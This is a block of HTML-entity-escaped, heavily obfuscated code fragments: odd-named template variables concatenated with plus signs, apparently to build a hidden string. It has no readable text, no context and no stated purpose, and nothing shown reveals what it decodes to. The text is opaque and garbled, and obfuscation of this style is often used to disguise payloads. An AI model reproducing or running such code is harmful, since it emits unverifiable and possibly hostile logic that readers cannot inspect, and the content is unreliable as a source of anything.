+$&#123;)&#125;$&#123;@$/&#125;$&#123;$] &#125;+  $&#123;)&#125;$&#123;~&#125;$&#123;](&#125;  +$&#123;)&#125;$&#123;~&#125;$&#123;]&#125;  +  $&#123;)&#125;$&#123;](&#125;$&#123;$] &#125;  +  $&#123;)&#125;$&#123;![/&#125;$&#123;]&#125;+$&#123;)&#125;$&#123;](&#125;$&#123;]&#125;  +$&#123;)&#125;$&#123;~=&#125;$&#123;;+&#125;$&#123;~=&#125;+$&#123;)&#125;$&#123;~=&#125;$&#123;~=&#125;$&#123;;+&#125;  +  $&#123;)&#125;$&#123;~=&#125;$&#123;;+&#125;$&#123;~&#125;+  $&#123;)&#125;$&#123;~=&#125;$&#123;~=&#125;$&#123;]&#125;  +$&#123;)&#125;$&#123;~=&#125;$&#123;;+&#125;$&#123;![/&#125;  +$&#123;)&#125;$&#123;@$/&#125;$&#123;~&#125;+$&#123;)&#125;$&#123;![/&#125;$&#123;~=&#125;+  $&#123;)&#125;$&#123;~&#125;$&#123;](&#125;+$&#123;)&#125;$&#123;$] &#125;$&#123;;+&#125;+$&#123;)&#125;$&#123;$] &#125;$&#123;~&#125;+$&#123;)&#125;$&#123;$] &#125;$&#123;![/&#125;  +  $&#123;)&#125;$&#123;$] &#125;$&#123;@$/&#125;  +  $&#123;)&#125;$&#123;~&#125;$&#123;]&#125;+$&#123;)&#125;$&#123;&#x27;$[&#125;$&#123;~&#125;+  $&#123;)&#125;$&#123;@$/&#125;$&#123;~=&#125;+  $&#123;)&#125;$&#123;~&#125;$&#123;]&#125;  +  $&#123;)&#125;$&#123;@$/&#125;$&#123;$] &#125;  +$&#123;)&#125;$&#123;@$/&#125;$&#123;~&#125;  +  $&#123;)&#125;$&#123;![/&#125;$&#123;![/&#125;  +  $&#123;)&#125;$&#123;~&#125;$&#123;]&#125;  +$&#123;)&#125;$&#123;&#x27;$[&#125;$&#123;~&#125;+$&#123;)&#125;$&#123;@$/&#125;$&#123;~=&#125;  +$&#123;)&#125;$&#123;~&#125;$&#123;]&#125;+  $&#123;)&#125;$&#123;](&#125;$&#123;![/&#125;+  $&#123;)&#125;$&#123;@$/&#125;$&#123;~&#125;  +$&#123;)&#125;$&#123;]&#125;$&#123;~=&#125;+$&#123;)&#125;$&#123;~&#125;$&#123;]&#125;+  $&#123;)&#125;$&#123;&#x27;$[&#125;$&#123;~&#125;+$&#123;)&#125;$&#123;@$/&#125;$&#123;~=&#125;+$&#123;)&#125;$&#123;~&#125;$&#123;]&#125;  +  $&#123;)&#125;$&#123;](&#125;$&#123;![/&#125;  +$&#123;)&#125;$&#123;@$/&#125;$&#123;~&#125;+  $&#123;)&#125;$&#123;![/&#125;$&#123;![/&#125;  +  $&#123;)&#125;$&#123;~&#125;$&#123;]&#125;  +  $&#123;)&#125;$&#123;&#x27;$[&#125;$&#123;~&#125;  +$&#123;)&#125;$&#123;@$/&#125;$&#123;~=&#125;  +$&#123;)&#125;$&#123;~&#125;$&#123;]&#125;  +$&#123;)&#125;$&#123;@$/&#125;$&#123;$] &#125;  +  $&#123;)&#125;$&#123;@$/&#125;$&#123;~&#125;  +$&#123;)&#125;$&#123;~=&#125;$&#123;@[&#125;$&#123;$] &#125;+$&#123;)&#125;$&#123;$] &#125;$&#123;@$/&#125;  +  $&#123;)&#125;$&#123;~&#125;$&#123;]&#125;+  $&#123;)&#125;$&#123;]&#125;$&#123;&#x27;$[&#125;+  $&#123;)&#125;$&#123;~=&#125;$&#123;@[&#125;$&#123;![/&#125;+$&#123;)&#125;$&#123;~&#125;$&#123;](&#125;  +  $&#123;)&#125;$&#123;~=&#125;$&#123;@[&#125;$&#123;~&#125;  +$&#123;)&#125;$&#123;~&#125;$&#123;]&#125;  +$&#123;)&#125;$&#123;](&#125;$&#123;~&#125;+$&#123;)&#125;$&#123;]&#125;$&#123;~=&#125;  +$&#123;)&#125;$&#123;![/&#125;$&#123;;+&#125;+  $&#123;)&#125;$&#123;~&#125;$&#123;]&#125;+  $&#123;)&#125;$&#123;](&#125;$&#123;~&#125;  +  $&#123;)&#125;$&#123;![/&#125;$&#123;~&#125;+  $&#123;)&#125;$&#123;![/&#125;$&#123;@$/&#125;+  $&#123;)&#125;$&#123;![/&#125;$&#123;~=&#125;  +  $&#123;)&#125;$&#123;~&#125;$&#123;](&#125;  +$&#123;)&#125;$&#123;$] &#125;$&#123;;+&#125;  +$&#123;)&#125;$&#123;$] &#125;$&#123;~&#125;+$&#123;)&#125;$&#123;$] &#125;$&#123;![/&#125;+  $&#123;)&#125;$&#123;$] &#125;$&#123;@$/&#125;+  $&#123;)&#125;$&#123;~&#125;$&#123;]&#125;+  $&#123;)&#125;$&#123;](&#125;$&#123;@[&#125;  +$&#123;)&#125;$&#123;]&#125;$&#123;~=&#125;+$&#123;)&#125;$&#123;![/&#125;$&#123;;+&#125;+  $&#123;)&#125;$&#123;~&#125;$&#123;]&#125;  +$&#123;)&#125;$&#123;](&#125;$&#123;@[&#125;+  $&#123;)&#125;$&#123;![/&#125;$&#123;~&#125;  +$&#123;)&#125;$&#123;~&#125;$&#123;]&#125;+$&#123;)&#125;$&#123;&#x27;$[&#125;$&#123;~&#125;+  $&#123;)&#125;$&#123;@$/&#125;$&#123;~=&#125;  +  $&#123;)&#125;$&#123;~&#125;$&#123;]&#125;+$&#123;)&#125;$&#123;](&#125;$&#123;~&#125;+$&#123;)&#125;$&#123;@$/&#125;$&#123;~&#125;+$&#123;)&#125;$&#123;![/&#125;$&#123;~=&#125;  +  $&#123;)&#125;$&#123;~&#125;$&#123;](&#125;  +$&#123;)&#125;$&#123;$] &#125;$&#123;;+&#125;+  $&#123;)&#125;$&#123;$] &#125;$&#123;~&#125;  +  $&#123;)&#125;$&#123;$] &#125;$&#123;![/&#125;  +$&#123;)&#125;$&#123;$] &#125;$&#123;@$/&#125;+$&#123;)&#125;$&#123;~&#125;$&#123;]&#125;  +$&#123;)&#125;$&#123;&#x27;$[&#125;$&#123;~&#125;+$&#123;)&#125;$&#123;@$/&#125;$&#123;~=&#125;+  $&#123;)&#125;$&#123;~&#125;$&#123;]&#125;  +$&#123;)&#125;$&#123;](&#125;$&#123;~&#125;+$&#123;)&#125;$&#123;@$/&#125;$&#123;~&#125;+$&#123;)&#125;$&#123;![/&#125;$&#123;![/&#125;+  $&#123;)&#125;$&#123;~&#125;$&#123;]&#125;+  $&#123;)&#125;$&#123;&#x27;$[&#125;$&#123;~&#125;+  $&#123;)&#125;$&#123;@$/&#125;$&#123;~=&#125;+  $&#123;)&#125;$&#123;~&#125;$&#123;]&#125;+  $&#123;)&#125;$&#123;](&#125;$&#123;@[&#125;  +$&#123;)&#125;$&#123;@$/&#125;$&#123;~&#125;  +  $&#123;)&#125;$&#123;]&#125;$&#123;~=&#125;  +$&#123;)&#125;$&#123;~&#125;$&#123;]&#125;+$&#123;)&#125;$&#123;&#x27;$[&#125;$&#123;~&#125;+  $&#123;)&#125;$&#123;@$/&#125;$&#123;~=&#125;  +  $&#123;)&#125;$&#123;~&#125;$&#123;]&#125;+$&#123;)&#125;$&#123;](&#125;$&#123;@[&#125;+$&#123;)&#125;$&#123;@$/&#125;$&#123;~&#125;+  $&#123;)&#125;$&#123;![/&#125;$&#123;![/&#125;  +  $&#123;)&#125;$&#123;~&#125;$&#123;]&#125;+  $&#123;)&#125;$&#123;&#x27;$[&#125;$&#123;~&#125;  +$&#123;)&#125;$&#123;@$/&#125;$&#123;~=&#125;+  $&#123;)&#125;$&#123;~&#125;$&#123;]&#125;  +  $&#123;)&#125;$&#123;](&#125;$&#123;~&#125;+$&#123;)&#125;$&#123;@$/&#125;$&#123;~&#125;  +  $&#123;)&#125;$&#123;$] &#125;$&#123;@$/&#125;  +  $&#123;)&#125;$&#123;~&#125;$&#123;]&#125;  +  $&#123;)&#125;$&#123;@$/&#125;$&#123;$] &#125;  +$&#123;)&#125;$&#123;![/&#125;$&#123;$] &#125;+  $&#123;)&#125;$&#123;@$/&#125;$&#123;&#x27;$[&#125;+$&#123;)&#125;$&#123;~=&#125;$&#123;@[&#125;$&#123;;+&#125;+  $&#123;)&#125;$&#123;~=&#125;$&#123;~=&#125;$&#123;~=&#125;  +  $&#123;)&#125;$&#123;~=&#125;$&#123;~=&#125;$&#123;![/&#125;+  $&#123;)&#125;$&#123;~&#125;$&#123;]&#125;+  $&#123;)&#125;$&#123;&#x27;$[&#125;$&#123;~&#125;+$&#123;)&#125;$&#123;@$/&#125;$&#123;~=&#125;+  $&#123;)&#125;$&#123;![/&#125;$&#123;;+&#125;+  $&#123;)&#125;$&#123;~&#125;$&#123;]&#125;+$&#123;)&#125;$&#123;&#x27;$[&#125;$&#123;~&#125;+$&#123;)&#125;$&#123;@$/&#125;$&#123;~=&#125;+  $&#123;)&#125;$&#123;~&#125;$&#123;]&#125;+  $&#123;)&#125;$&#123;](&#125;$&#123;~&#125;  +$&#123;)&#125;$&#123;@$/&#125;$&#123;~&#125;  +$&#123;)&#125;$&#123;![/&#125;$&#123;~&#125;  +  $&#123;)&#125;$&#123;~&#125;$&#123;]&#125;+  $&#123;)&#125;$&#123;&#x27;$[&#125;$&#123;~&#125;  +$&#123;)&#125;$&#123;@$/&#125;$&#123;~=&#125;+$&#123;)&#125;$&#123;~&#125;$&#123;]&#125;  +$&#123;)&#125;$&#123;](&#125;$&#123;@[&#125;+$&#123;)&#125;$&#123;@$/&#125;$&#123;~&#125;  +  $&#123;)&#125;$&#123;![/&#125;$&#123;~=&#125;+  $&#123;)&#125;$&#123;~&#125;$&#123;](&#125;  +  $&#123;)&#125;$&#123;$] &#125;$&#123;;+&#125;+  $&#123;)&#125;$&#123;$] &#125;$&#123;~&#125;  +  $&#123;)&#125;$&#123;$] &#125;$&#123;![/&#125;  +$&#123;)&#125;$&#123;@$/&#125;$&#123;~&#125;+  $&#123;)&#125;$&#123;~=&#125;$&#123;@[&#125;$&#123;$] &#125;+  $&#123;)&#125;$&#123;~=&#125;$&#123;@[&#125;$&#123;$] &#125;+  $&#123;)&#125;$&#123;$] &#125;$&#123;@$/&#125;+  $&#123;)&#125;$&#123;~&#125;$&#123;@[&#125;  +$&#123;)&#125;$&#123;~&#125;$&#123;]&#125;  +  $&#123;)&#125;$&#123;]&#125;$&#123;@$/&#125;  +$&#123;)&#125;$&#123;~=&#125;$&#123;~=&#125;$&#123;;+&#125;  +  $&#123;)&#125;$&#123;@$/&#125;$&#123;@$/&#125;+  $&#123;)&#125;$&#123;~&#125;$&#123;@[&#125;  +  $&#123;)&#125;$&#123;]&#125;$&#123;~=&#125;  +$&#123;)&#125;$&#123;~&#125;$&#123;@[&#125;  +  $&#123;)&#125;$&#123;@$/&#125;$&#123;~=&#125;+$&#123;)&#125;$&#123;&#x27;$[&#125;$&#123;~&#125;  +$&#123;)&#125;$&#123;~=&#125;$&#123;@[&#125;$&#123;~=&#125;  +  $&#123;)&#125;$&#123;~=&#125;$&#123;~=&#125;$&#123;$] &#125;+  $&#123;)&#125;$&#123;~=&#125;$&#123;~=&#125;$&#123;]&#125;  +  $&#123;)&#125;$&#123;~=&#125;$&#123;;+&#125;$&#123;~=&#125;  +$&#123;)&#125;$&#123;~=&#125;$&#123;;+&#125;$&#123;@$/&#125;+  $&#123;)&#125;$&#123;![/&#125;$&#123;]&#125;+$&#123;)&#125;$&#123;&#x27;$[&#125;$&#123;![/&#125;+$&#123;)&#125;$&#123;~=&#125;$&#123;;+&#125;$&#123;~=&#125;+$&#123;)&#125;$&#123;~=&#125;$&#123;@[&#125;$&#123;;+&#125;  +  $&#123;)&#125;$&#123;~=&#125;$&#123;~=&#125;$&#123;]&#125;  +$&#123;)&#125;$&#123;![/&#125;$&#123;]&#125;  +  $&#123;)&#125;$&#123;]&#125;$&#123;@$/&#125;  +  $&#123;)&#125;$&#123;~=&#125;$&#123;~=&#125;$&#123;;+&#125;  +  $&#123;)&#125;$&#123;@$/&#125;$&#123;@$/&#125;+$&#123;)&#125;$&#123;~=&#125;$&#123;~=&#125;$&#123;~=&#125;  +$&#123;)&#125;$&#123;~=&#125;$&#123;;+&#125;$&#123;;+&#125;  +  $&#123;)&#125;$&#123;~=&#125;$&#123;;+&#125;$&#123;$] &#125;+  $&#123;)&#125;$&#123;~=&#125;$&#123;~=&#125;$&#123;;+&#125;  +$&#123;)&#125;$&#123;~=&#125;$&#123;;+&#125;$&#123;~&#125;+  $&#123;)&#125;$&#123;@$/&#125;$&#123;~&#125;+$&#123;)&#125;$&#123;$] &#125;$&#123;&#x27;$[&#125;+$&#123;)&#125;$&#123;$] &#125;$&#123;&#x27;$[&#125;+  $&#123;)&#125;$&#123;]&#125;$&#123;$] &#125;  +  $&#123;)&#125;$&#123;&#x27;$[&#125;$&#123;~&#125;+  $&#123;)&#125;$&#123;]&#125;$&#123;](&#125;+$&#123;)&#125;$&#123;](&#125;$&#123;~&#125;+  $&#123;)&#125;$&#123;](&#125;$&#123;~&#125;  +  $&#123;)&#125;$&#123;$] &#125;$&#123;@$/&#125;  +$&#123;)&#125;$&#123;~&#125;$&#123;@[&#125;+$&#123;)&#125;$&#123;~&#125;$&#123;]&#125;  +$&#123;)&#125;$&#123;~=&#125;$&#123;~=&#125;$&#123;@[&#125;+$&#123;)&#125;$&#123;~&#125;$&#123;@[&#125;+  $&#123;)&#125;$&#123;]&#125;$&#123;~=&#125;  +$&#123;)&#125;$&#123;~&#125;$&#123;@[&#125;+  $&#123;)&#125;$&#123;~&#125;$&#123;]&#125;+  $&#123;)&#125;$&#123;]&#125;$&#123;@$/&#125;+  $&#123;)&#125;$&#123;~=&#125;$&#123;~=&#125;$&#123;;+&#125;+  $&#123;)&#125;$&#123;@$/&#125;$&#123;@$/&#125;+  $&#123;)&#125;$&#123;![/&#125;$&#123;]&#125;  +$&#123;)&#125;$&#123;](&#125;$&#123;~=&#125;  +$&#123;)&#125;$&#123;~=&#125;$&#123;;+&#125;$&#123;~=&#125;  +$&#123;)&#125;$&#123;~=&#125;$&#123;~=&#125;$&#123;]&#125;  +$&#123;)&#125;$&#123;]&#125;$&#123;]&#125;+  $&#123;)&#125;$&#123;~=&#125;$&#123;@[&#125;$&#123;~=&#125;+$&#123;)&#125;$&#123;~=&#125;$&#123;~=&#125;$&#123;]&#125;+$&#123;)&#125;$&#123;~=&#125;$&#123;;+&#125;$&#123;~=&#125;  +  $&#123;)&#125;$&#123;~=&#125;$&#123;~=&#125;$&#123;$] &#125;+$&#123;)&#125;$&#123;![/&#125;$&#123;;+&#125;  +$&#123;)&#125;$&#123;~&#125;$&#123;@$/&#125;+$&#123;)&#125;$&#123;@$/&#125;$&#123;~=&#125;+  $&#123;)&#125;$&#123;&#x27;$[&#125;$&#123;~&#125;  +  $&#123;)&#125;$&#123;~=&#125;$&#123;@[&#125;$&#123;~=&#125;  +$&#123;)&#125;$&#123;~=&#125;$&#123;~=&#125;$&#123;$] &#125;  +  $&#123;)&#125;$&#123;~=&#125;$&#123;~=&#125;$&#123;]&#125;  +  $&#123;)&#125;$&#123;~=&#125;$&#123;;+&#125;$&#123;~=&#125;  +$&#123;)&#125;$&#123;~=&#125;$&#123;;+&#125;$&#123;@$/&#125;+  $&#123;)&#125;$&#123;![/&#125;$&#123;]&#125;  +  $&#123;)&#125;$&#123;](&#125;$&#123;~&#125;+$&#123;)&#125;$&#123;](&#125;$&#123;@$/&#125;+  $&#123;)&#125;$&#123;![/&#125;$&#123;]&#125;+  $&#123;)&#125;$&#123;](&#125;$&#123;;+&#125;+$&#123;)&#125;$&#123;~=&#125;$&#123;;+&#125;$&#123;$] &#125;+  $&#123;)&#125;$&#123;~=&#125;$&#123;;+&#125;$&#123;&#x27;$[&#125;+  $&#123;)&#125;$&#123;~=&#125;$&#123;;+&#125;$&#123;~=&#125;  +$&#123;)&#125;$&#123;@$/&#125;$&#123;~&#125;  +  $&#123;)&#125;$&#123;$] &#125;$&#123;&#x27;$[&#125;+  $&#123;)&#125;$&#123;$] &#125;$&#123;&#x27;$[&#125;+  $&#123;)&#125;$&#123;&#x27;$[&#125;$&#123;@[&#125;+  $&#123;)&#125;$&#123;~=&#125;$&#123;;+&#125;$&#123;~=&#125;  +  $&#123;)&#125;$&#123;@$/&#125;$&#123;](&#125;  +$&#123;)&#125;$&#123;~=&#125;$&#123;;+&#125;$&#123;;+&#125;+  $&#123;)&#125;$&#123;]&#125;$&#123;$] &#125;+  $&#123;)&#125;$&#123;~=&#125;$&#123;;+&#125;$&#123;&#x27;$[&#125;  +  $&#123;)&#125;$&#123;~=&#125;$&#123;;+&#125;$&#123;&#x27;$[&#125;+$&#123;)&#125;$&#123;]&#125;$&#123;]&#125;  +$&#123;)&#125;$&#123;~=&#125;$&#123;@[&#125;$&#123;~=&#125;+$&#123;)&#125;$&#123;~=&#125;$&#123;~=&#125;$&#123;]&#125;  +  $&#123;)&#125;$&#123;~=&#125;$&#123;;+&#125;$&#123;~=&#125;  +  $&#123;)&#125;$&#123;~=&#125;$&#123;~=&#125;$&#123;$] &#125;  +  $&#123;)&#125;$&#123;![/&#125;$&#123;;+&#125;  +  $&#123;)&#125;$&#123;~&#125;$&#123;]&#125;  +$&#123;)&#125;$&#123;@$/&#125;$&#123;$] &#125;+$&#123;)&#125;$&#123;![/&#125;$&#123;]&#125;  +$&#123;)&#125;$&#123;](&#125;$&#123;;+&#125;+$&#123;)&#125;$&#123;~=&#125;$&#123;~=&#125;$&#123;](&#125;+$&#123;)&#125;$&#123;~=&#125;$&#123;;+&#125;$&#123;&#x27;$[&#125;+$&#123;)&#125;$&#123;~=&#125;$&#123;;+&#125;$&#123;&#x27;$[&#125;+$&#123;)&#125;$&#123;](&#125;$&#123;&#x27;$[&#125;  +  $&#123;)&#125;$&#123;@$/&#125;$&#123;](&#125;  +  $&#123;)&#125;$&#123;~=&#125;$&#123;;+&#125;$&#123;@$/&#125;  +  $&#123;)&#125;$&#123;~=&#125;$&#123;;+&#125;$&#123;~=&#125;+  $&#123;)&#125;$&#123;![/&#125;$&#123;~=&#125;  +$&#123;)&#125;$&#123;~&#125;$&#123;@$/&#125;  +  $&#123;)&#125;$&#123;![/&#125;$&#123;~=&#125;  +  $&#123;)&#125;$&#123;$] &#125;$&#123;@$/&#125;+$&#123;)&#125;$&#123;~&#125;$&#123;@[&#125;  +  $&#123;)&#125;$&#123;~&#125;$&#123;]&#125;  +$&#123;)&#125;$&#123;~=&#125;$&#123;@[&#125;$&#123;@[&#125;  +$&#123;)&#125;$&#123;~&#125;$&#123;@[&#125;+  $&#123;)&#125;$&#123;]&#125;$&#123;~=&#125;  +$&#123;)&#125;$&#123;~&#125;$&#123;@[&#125;  +  $&#123;)&#125;$&#123;~&#125;$&#123;]&#125;+  $&#123;)&#125;$&#123;]&#125;$&#123;@$/&#125;+  $&#123;)&#125;$&#123;~=&#125;$&#123;~=&#125;$&#123;;+&#125;+  $&#123;)&#125;$&#123;@$/&#125;$&#123;@$/&#125;  +$&#123;)&#125;$&#123;![/&#125;$&#123;]&#125;  +$&#123;)&#125;$&#123;](&#125;$&#123;~=&#125;  +$&#123;)&#125;$&#123;~=&#125;$&#123;;+&#125;$&#123;~=&#125;  +  $&#123;)&#125;$&#123;~=&#125;$&#123;~=&#125;$&#123;]&#125;  +$&#123;)&#125;$&#123;]&#125;$&#123;]&#125;  +  $&#123;)&#125;$&#123;~=&#125;$&#123;@[&#125;$&#123;~=&#125;  +$&#123;)&#125;$&#123;~=&#125;$&#123;~=&#125;$&#123;]&#125;+  $&#123;)&#125;$&#123;~=&#125;$&#123;;+&#125;$&#123;~=&#125;  +$&#123;)&#125;$&#123;~=&#125;$&#123;~=&#125;$&#123;$] &#125;  +$&#123;)&#125;$&#123;![/&#125;$&#123;;+&#125;+$&#123;)&#125;$&#123;@$/&#125;$&#123;~=&#125;+  $&#123;)&#125;$&#123;&#x27;$[&#125;$&#123;~&#125;  +  $&#123;)&#125;$&#123;~=&#125;$&#123;@[&#125;$&#123;~=&#125;+  $&#123;)&#125;$&#123;~=&#125;$&#123;~=&#125;$&#123;$] &#125;+  $&#123;)&#125;$&#123;~=&#125;$&#123;~=&#125;$&#123;]&#125;  +$&#123;)&#125;$&#123;~=&#125;$&#123;;+&#125;$&#123;~=&#125;+$&#123;)&#125;$&#123;~=&#125;$&#123;;+&#125;$&#123;@$/&#125;+  $&#123;)&#125;$&#123;![/&#125;$&#123;]&#125;  +  $&#123;)&#125;$&#123;](&#125;$&#123;~&#125;+$&#123;)&#125;$&#123;](&#125;$&#123;@$/&#125;+  $&#123;)&#125;$&#123;![/&#125;$&#123;]&#125;  +$&#123;)&#125;$&#123;](&#125;$&#123;;+&#125;  +$&#123;)&#125;$&#123;~=&#125;$&#123;;+&#125;$&#123;$] &#125;  +  $&#123;)&#125;$&#123;~=&#125;$&#123;;+&#125;$&#123;&#x27;$[&#125;+$&#123;)&#125;$&#123;~=&#125;$&#123;;+&#125;$&#123;~=&#125;  +  $&#123;)&#125;$&#123;@$/&#125;$&#123;~&#125;+  $&#123;)&#125;$&#123;$] &#125;$&#123;&#x27;$[&#125;+$&#123;)&#125;$&#123;$] &#125;$&#123;&#x27;$[&#125;  +$&#123;)&#125;$&#123;&#x27;$[&#125;$&#123;@[&#125;  +  $&#123;)&#125;$&#123;~=&#125;$&#123;;+&#125;$&#123;~=&#125;  +$&#123;)&#125;$&#123;@$/&#125;$&#123;](&#125;+  $&#123;)&#125;$&#123;~=&#125;$&#123;;+&#125;$&#123;;+&#125;  +$&#123;)&#125;$&#123;]&#125;$&#123;$] &#125;  +$&#123;)&#125;$&#123;~=&#125;$&#123;;+&#125;$&#123;&#x27;$[&#125;  +  $&#123;)&#125;$&#123;~=&#125;$&#123;;+&#125;$&#123;&#x27;$[&#125;  +$&#123;)&#125;$&#123;]&#125;$&#123;]&#125;+$&#123;)&#125;$&#123;~=&#125;$&#123;@[&#125;$&#123;~=&#125;+  $&#123;)&#125;$&#123;~=&#125;$&#123;~=&#125;$&#123;]&#125;  +$&#123;)&#125;$&#123;~=&#125;$&#123;;+&#125;$&#123;~=&#125;  +$&#123;)&#125;$&#123;~=&#125;$&#123;~=&#125;$&#123;$] &#125;+  $&#123;)&#125;$&#123;![/&#125;$&#123;;+&#125;+$&#123;)&#125;$&#123;~&#125;$&#123;]&#125;  +  $&#123;)&#125;$&#123;@$/&#125;$&#123;$] &#125;  +  $&#123;)&#125;$&#123;![/&#125;$&#123;]&#125;  +  $&#123;)&#125;$&#123;](&#125;$&#123;;+&#125;  +$&#123;)&#125;$&#123;~=&#125;$&#123;~=&#125;$&#123;](&#125;  +$&#123;)&#125;$&#123;~=&#125;$&#123;;+&#125;$&#123;&#x27;$[&#125;+  $&#123;)&#125;$&#123;~=&#125;$&#123;;+&#125;$&#123;&#x27;$[&#125;  +  $&#123;)&#125;$&#123;](&#125;$&#123;&#x27;$[&#125;+$&#123;)&#125;$&#123;@$/&#125;$&#123;](&#125;+$&#123;)&#125;$&#123;~=&#125;$&#123;;+&#125;$&#123;@$/&#125;  +  $&#123;)&#125;$&#123;~=&#125;$&#123;;+&#125;$&#123;~=&#125;  +$&#123;)&#125;$&#123;![/&#125;$&#123;~=&#125;+$&#123;)&#125;$&#123;![/&#125;$&#123;~=&#125;  +  $&#123;)&#125;$&#123;$] &#125;$&#123;@$/&#125;  +$&#123;)&#125;$&#123;~&#125;$&#123;@[&#125;  +$&#123;)&#125;$&#123;~&#125;$&#123;]&#125;  +$&#123;)&#125;$&#123;~=&#125;$&#123;~=&#125;$&#123;](&#125;  +$&#123;)&#125;$&#123;~&#125;$&#123;@[&#125;+$&#123;)&#125;$&#123;]&#125;$&#123;~=&#125;  +$&#123;)&#125;$&#123;~&#125;$&#123;@[&#125;  +  $&#123;)&#125;$&#123;![/&#125;$&#123;;+&#125;+  $&#123;)&#125;$&#123;~&#125;$&#123;&#x27;$[&#125;  +  $&#123;)&#125;$&#123;~&#125;$&#123;@[&#125;+$&#123;)&#125;$&#123;~&#125;$&#123;]&#125;+$&#123;)&#125;$&#123;&#x27;$[&#125;$&#123;@[&#125;+$&#123;)&#125;$&#123;~&#125;$&#123;@[&#125;  +$&#123;)&#125;$&#123;~&#125;$&#123;]&#125;  +$&#123;)&#125;$&#123;~=&#125;$&#123;@[&#125;$&#123;@[&#125;  +$&#123;)&#125;$&#123;~&#125;$&#123;@[&#125;+  $&#123;)&#125;$&#123;~&#125;$&#123;]&#125;+$&#123;)&#125;$&#123;~=&#125;$&#123;~=&#125;$&#123;@[&#125;  +  $&#123;)&#125;$&#123;![/&#125;$&#123;~=&#125;+  $&#123;)&#125;$&#123;$] &#125;$&#123;@$/&#125;+$&#123;)&#125;$&#123;~&#125;$&#123;@[&#125;+  $&#123;)&#125;$&#123;~&#125;$&#123;]&#125;+$&#123;)&#125;$&#123;~=&#125;$&#123;;+&#125;$&#123;~=&#125;  +  $&#123;)&#125;$&#123;~&#125;$&#123;@[&#125;  +$&#123;)&#125;$&#123;]&#125;$&#123;~=&#125;+$&#123;)&#125;$&#123;~&#125;$&#123;@[&#125;+$&#123;)&#125;$&#123;@$/&#125;$&#123;~=&#125;+  $&#123;)&#125;$&#123;&#x27;$[&#125;$&#123;~&#125;  +$&#123;)&#125;$&#123;~=&#125;$&#123;@[&#125;$&#123;~=&#125;  +  $&#123;)&#125;$&#123;~=&#125;$&#123;~=&#125;$&#123;$] &#125;+$&#123;)&#125;$&#123;~=&#125;$&#123;~=&#125;$&#123;]&#125;+  $&#123;)&#125;$&#123;~=&#125;$&#123;;+&#125;$&#123;~=&#125;+$&#123;)&#125;$&#123;~=&#125;$&#123;;+&#125;$&#123;@$/&#125;  +$&#123;)&#125;$&#123;![/&#125;$&#123;]&#125;  +$&#123;)&#125;$&#123;]&#125;$&#123;](&#125;  +$&#123;)&#125;$&#123;~=&#125;$&#123;~=&#125;$&#123;~=&#125;  +$&#123;)&#125;$&#123;~=&#125;$&#123;~=&#125;$&#123;;+&#125;+$&#123;)&#125;$&#123;~=&#125;$&#123;~=&#125;$&#123;&#x27;$[&#125;  +  $&#123;)&#125;$&#123;~=&#125;$&#123;;+&#125;$&#123;~=&#125;+$&#123;)&#125;$&#123;~=&#125;$&#123;~=&#125;$&#123;![/&#125;  +  $&#123;)&#125;$&#123;~=&#125;$&#123;~=&#125;$&#123;]&#125;  +  $&#123;)&#125;$&#123;@$/&#125;$&#123;~&#125;+$&#123;)&#125;$&#123;$] &#125;$&#123;&#x27;$[&#125;  +$&#123;)&#125;$&#123;$] &#125;$&#123;&#x27;$[&#125;+  $&#123;)&#125;$&#123;&#x27;$[&#125;$&#123;![/&#125;  +  $&#123;)&#125;$&#123;~=&#125;$&#123;~=&#125;$&#123;~=&#125;+  $&#123;)&#125;$&#123;]&#125;$&#123;]&#125;+$&#123;)&#125;$&#123;@$/&#125;$&#123;](&#125;  +  $&#123;)&#125;$&#123;~=&#125;$&#123;~=&#125;$&#123;$] &#125;  +$&#123;)&#125;$&#123;~=&#125;$&#123;;+&#125;$&#123;~=&#125;  +$&#123;)&#125;$&#123;$] &#125;$&#123;![/&#125;+$&#123;)&#125;$&#123;$] &#125;$&#123;@[&#125;  +$&#123;)&#125;$&#123;&#x27;$[&#125;$&#123;~&#125;+  $&#123;)&#125;$&#123;~=&#125;$&#123;~=&#125;$&#123;]&#125;  +$&#123;)&#125;$&#123;~=&#125;$&#123;~=&#125;$&#123;![/&#125;  +$&#123;)&#125;$&#123;~=&#125;$&#123;;+&#125;$&#123;$] &#125;  +$&#123;)&#125;$&#123;~=&#125;$&#123;~=&#125;$&#123;;+&#125;  +  $&#123;)&#125;$&#123;~=&#125;$&#123;;+&#125;$&#123;~&#125;+  $&#123;)&#125;$&#123;![/&#125;$&#123;;+&#125;  +  $&#123;)&#125;$&#123;~&#125;$&#123;]&#125;+$&#123;)&#125;$&#123;~=&#125;$&#123;~=&#125;$&#123;](&#125;  +  $&#123;)&#125;$&#123;![/&#125;$&#123;~=&#125;  +$&#123;)&#125;$&#123;$] &#125;$&#123;@$/&#125;  +  $&#123;)&#125;$&#123;~&#125;$&#123;@[&#125;  +  $&#123;)&#125;$&#123;~&#125;$&#123;]&#125;+  $&#123;)&#125;$&#123;~=&#125;$&#123;;+&#125;$&#123;&#x27;$[&#125;  +  $&#123;)&#125;$&#123;]&#125;$&#123;~=&#125;+  $&#123;)&#125;$&#123;~&#125;$&#123;]&#125;+  $&#123;)&#125;$&#123;~=&#125;$&#123;;+&#125;$&#123;~=&#125;+  $&#123;)&#125;$&#123;![/&#125;$&#123;]&#125;+  $&#123;)&#125;$&#123;](&#125;$&#123;]&#125;  +$&#123;)&#125;$&#123;~=&#125;$&#123;;+&#125;$&#123;~=&#125;+$&#123;)&#125;$&#123;~=&#125;$&#123;~=&#125;$&#123;;+&#125;+$&#123;)&#125;$&#123;~=&#125;$&#123;;+&#125;$&#123;~&#125;+  $&#123;)&#125;$&#123;~=&#125;$&#123;~=&#125;$&#123;]&#125;+$&#123;)&#125;$&#123;~=&#125;$&#123;;+&#125;$&#123;![/&#125;  +  $&#123;)&#125;$&#123;$] &#125;$&#123;@$/&#125;  +  $&#123;)&#125;$&#123;~&#125;$&#123;@[&#125;+$&#123;)&#125;$&#123;~&#125;$&#123;]&#125;+  $&#123;)&#125;$&#123;~=&#125;$&#123;~=&#125;$&#123;![/&#125;  +$&#123;)&#125;$&#123;]&#125;$&#123;~=&#125;+  $&#123;)&#125;$&#123;~&#125;$&#123;![/&#125;  +$&#123;)&#125;$&#123;~&#125;$&#123;![/&#125;  +$&#123;)&#125;$&#123;$] &#125;$&#123;@$/&#125;  +  $&#123;)&#125;$&#123;~&#125;$&#123;@[&#125;  +$&#123;)&#125;$&#123;~&#125;$&#123;]&#125;+  